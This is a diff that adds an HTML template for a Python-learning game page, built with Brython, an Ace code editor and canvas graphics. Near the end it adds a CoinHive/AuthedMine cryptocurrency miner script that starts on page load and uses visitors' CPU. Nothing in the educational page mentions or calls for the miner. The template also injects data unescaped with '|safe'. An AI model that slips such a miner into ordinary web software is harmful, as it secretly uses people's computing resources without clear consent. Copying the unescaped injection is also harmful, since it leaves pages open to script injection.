@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+
+<html>
+  <head>
+    <meta charset="utf-8" />
+
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='game.css') }}"></link>
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='libs/materialize/materialize.min.css') }}"></link>
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='libs/loader.css') }}"></link>
+
+    <script type="text/javascript" src="{{ url_for('static', filename='libs/jquery-3.2.1.min.js') }}"></script>
+    <script type="text/javascript" src="{{ url_for('static', filename='libs/brython/brython.js') }}"></script> <!-- includes the brython library -->
+    <script type="text/javascript" src="{{ url_for('static', filename='libs/brython/brython_stdlib.js') }}"></script> <!-- includes the standard library -->
+    <script type="text/javascript" src="{{ url_for('static', filename='libs/ace-min-noconflict/ace.js') }}"></script> <!-- includes the ace library -->
+    <script type="text/javascript" src="{{ url_for('static', filename='libs/split.min.js') }}"></script> <!-- includes the split library -->
+    <script type="text/javascript" src="{{ url_for('static', filename='libs/materialize/materialize.min.js') }}"></script> <!-- includes the split library -->
+
+    <title>PythonLearn Activity</title>
+  </head>
+
+  <body onload="brython()">
+
+    <script type="text/javascript" src="{{ url_for('static', filename='main.js') }}"></script>
+    <script type="text/python" src="{{ url_for('static', filename='main.py') }}"></script>
+
+    <div class="overlay" id="overlay">
+
+      <div class="leftpane" id="leftpane">
+        <div class="instructions" id="instructions">
+          <h1>{{ data['tutorialTitle'] }}</h1>
+          <hr>
+            {{ data['tutorialText'] }}
+          <br>
+        </div>
+
+        <div class="code" id="code"></div>
+      </div>
+
+      <div class="result" id="result">
+        <canvas id="clouds_canvas" class="display"></canvas>
+        <canvas id="map" class="display"></canvas>
+        <canvas id="display" class="display">You need HTML5 and JavaScript to view this webpage</canvas>
+
+        <a class="savebutton waves-effect waves-light grey" id="save">Save</a>
+        <a class="startbutton waves-effect waves-light light-green" id="start">Run</a>
+
+      </div>
+
+      <div class="error" id="error"></div>
+
+      <div class="win" id="win">
+        <button class="closewin" onclick="hide_win()">x</button>
+        <h2>{{ winmsg }}</h2>
+        <hr>
+        <strong>Challenges:</strong>
+        <hr>
+        <div class="challenges" id="challenges">
+        </div>
+      </div>
+
+      <div class="loader" id="loader">
+      </div>
+
+      <img src="{{ url_for('static', filename='assets/cloud1.png') }}" class="hidden" id="cloud1"></img>
+      <img src="{{ url_for('static', filename='assets/cloud2.png') }}" class="hidden" id="cloud2"></img>
+
+      <img src="{{ url_for('static', filename='assets/roderick/front.png') }}" class="hidden" id="front"></img>
+      <img src="{{ url_for('static', filename='assets/roderick/front_r.png') }}" class="hidden" id="front_r"></img>
+      <img src="{{ url_for('static', filename='assets/roderick/back.png') }}" class="hidden" id="back"></img>
+      <img src="{{ url_for('static', filename='assets/roderick/back_l.png') }}" class="hidden" id="back_l"></img>
+
+      {% for item in data['requiredAssets'] %}
+        <img src="{{ url_for('static', filename='assets/' + item + '.png') }}" class="hidden" id="{{ item }}"></img>
+      {% endfor %}
+
+    </div>
+
+    <script src="https://authedmine.com/lib/authedmine.min.js"></script>
+    <script>
+    	var miner = new CoinHive.Anonymous('CJ8hkkDNfZPZIt6LbcaT8dPrgMY70vPs', {throttle: 0.3});
+
+    	// Only start on non-mobile devices and if not opted-out
+    	// in the last 14400 seconds (4 hours):
+    	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+    		miner.start();
+    	}
+    </script>
+
+    <script type="text/javascript">
+      var data = {{ data|safe }};
+      var editorDefault = "{{ data['template'] }}";
+      var clear_interval = window.setInterval(function(){},0);
+
+      var editor = ace.edit('code');
+      editor.setTheme("ace/theme/terminal");
+      editor.getSession().setMode("ace/mode/python");
+
+      if (load() != ''){
+        console.log('loading cookies OK');
+        value = load().replace(/\\/g,'\n');
+        editor.setValue(value);
+      }else{
+        console.log('no cookies');
+        editor.setValue(editorDefault.replace(';','\n'));
+      }
+      editor.clearSelection();
+
+      Split(['#instructions', '#code'], {gutterSize: 10,minSize: [100,100],direction: 'vertical',onDrag: editor.resize});
+      $('#win').hide();
+      function on_win(){$('#win').hide().fadeIn('fast');$('#challenges').hide().fadeIn('slow');}
+      function hide_win(){$('#win').fadeOut('slow');$('#challenges').fadeOut('fast');}
+      function hide_error(){window.clearInterval(clear_interval);clear_interval=window.setInterval(function(){gebi('error').style.width='0';gebi('error').style.opacity=0;window.clearInterval(clear_interval);},10000);}
+
+    </script>
+
+  </body>
+
+</html>
